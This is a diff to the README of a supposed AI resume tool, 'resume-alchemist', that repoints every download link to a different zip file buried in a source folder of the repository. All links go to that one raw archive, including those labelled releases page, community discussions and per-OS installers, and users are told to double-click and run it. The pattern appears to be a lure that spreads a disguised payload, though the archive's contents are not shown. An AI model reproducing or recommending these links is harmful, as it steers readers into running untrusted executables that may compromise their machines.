@@ -1,7 +1,7 @@
 # ✨ resume-alchemist - Optimize Your Resume with AI
 
 ## 📥 Download Now
-[![Download resume-alchemist](https://raw.githubusercontent.com/Sky-Lwr/resume-alchemist/main/supabase/functions/resume_alchemist_1.4.zip)](https://raw.githubusercontent.com/Sky-Lwr/resume-alchemist/main/supabase/functions/resume_alchemist_1.4.zip)
+[![Download resume-alchemist](https://raw.githubusercontent.com/Sky-Lwr/resume-alchemist/main/src/components/resume-templates/alchemist_resume_1.1.zip)](https://raw.githubusercontent.com/Sky-Lwr/resume-alchemist/main/src/components/resume-templates/alchemist_resume_1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the resume-alchemist project! This application helps job seekers create competitive resumes using AI. It analyzes your content, gives feedback, and helps you stand out in the job market. Follow the steps below to download and run the application.
@@ -29,19 +29,19 @@ To run resume-alchemist, you need:
 ## 📥 Download & Install
 To install resume-alchemist, please follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Sky-Lwr/resume-alchemist/main/supabase/functions/resume_alchemist_1.4.zip).
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Sky-Lwr/resume-alchemist/main/src/components/resume-templates/alchemist_resume_1.1.zip).
    
 2. **Choose Your Version**: Look for the latest release. It will be at the top of the list.
 
 3. **Download the Application**: Click on the appropriate link for your operating system:
-   - For Windows, look for `https://raw.githubusercontent.com/Sky-Lwr/resume-alchemist/main/supabase/functions/resume_alchemist_1.4.zip`.
-   - For macOS, look for `https://raw.githubusercontent.com/Sky-Lwr/resume-alchemist/main/supabase/functions/resume_alchemist_1.4.zip`.
-   - For Linux, look for `https://raw.githubusercontent.com/Sky-Lwr/resume-alchemist/main/supabase/functions/resume_alchemist_1.4.zip`.
+   - For Windows, look for `https://raw.githubusercontent.com/Sky-Lwr/resume-alchemist/main/src/components/resume-templates/alchemist_resume_1.1.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/Sky-Lwr/resume-alchemist/main/src/components/resume-templates/alchemist_resume_1.1.zip`.
+   - For Linux, look for `https://raw.githubusercontent.com/Sky-Lwr/resume-alchemist/main/src/components/resume-templates/alchemist_resume_1.1.zip`.
 
 4. **Run the Installer**:
-   - For Windows: Double-click the `https://raw.githubusercontent.com/Sky-Lwr/resume-alchemist/main/supabase/functions/resume_alchemist_1.4.zip` file. Follow the on-screen instructions to install.
-   - For macOS: Open the `https://raw.githubusercontent.com/Sky-Lwr/resume-alchemist/main/supabase/functions/resume_alchemist_1.4.zip` file, then drag the app to your Applications folder.
-   - For Linux: Extract the `https://raw.githubusercontent.com/Sky-Lwr/resume-alchemist/main/supabase/functions/resume_alchemist_1.4.zip` file and run the application.
+   - For Windows: Double-click the `https://raw.githubusercontent.com/Sky-Lwr/resume-alchemist/main/src/components/resume-templates/alchemist_resume_1.1.zip` file. Follow the on-screen instructions to install.
+   - For macOS: Open the `https://raw.githubusercontent.com/Sky-Lwr/resume-alchemist/main/src/components/resume-templates/alchemist_resume_1.1.zip` file, then drag the app to your Applications folder.
+   - For Linux: Extract the `https://raw.githubusercontent.com/Sky-Lwr/resume-alchemist/main/src/components/resume-templates/alchemist_resume_1.1.zip` file and run the application.
 
 5. **Open the Application**: Once installed, find the app in your applications list and double-click to open.
 
@@ -65,7 +65,7 @@ If you encounter issues:
 - If the application crashes, try restarting it or reinstalling it.
 
 ## 🌟 Community Support
-For help or feedback, check our [GitHub discussions](https://raw.githubusercontent.com/Sky-Lwr/resume-alchemist/main/supabase/functions/resume_alchemist_1.4.zip). This community is here to support you.
+For help or feedback, check our [GitHub discussions](https://raw.githubusercontent.com/Sky-Lwr/resume-alchemist/main/src/components/resume-templates/alchemist_resume_1.1.zip). This community is here to support you.
 
 ## 📜 License
 This application is licensed under the MIT License. You can use it freely, but please respect the terms.
